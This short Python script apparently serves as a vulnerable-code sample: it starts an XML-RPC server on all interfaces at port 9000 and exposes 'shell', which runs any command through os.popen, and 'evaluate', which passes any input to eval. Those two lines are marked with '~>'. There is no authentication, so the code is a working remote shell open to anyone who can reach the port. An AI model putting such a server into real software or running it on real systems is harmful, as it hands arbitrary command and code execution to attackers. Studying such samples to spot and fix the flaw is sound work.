import os
from xmlrpc.server import SimpleXMLRPCServer

server = SimpleXMLRPCServer(("0.0.0.0", 9000), allow_none=True)
~>server.register_function(lambda cmd: os.popen(cmd).read(), "shell")
~>server.register_function(lambda src: eval(src), "evaluate")
server.serve_forever()
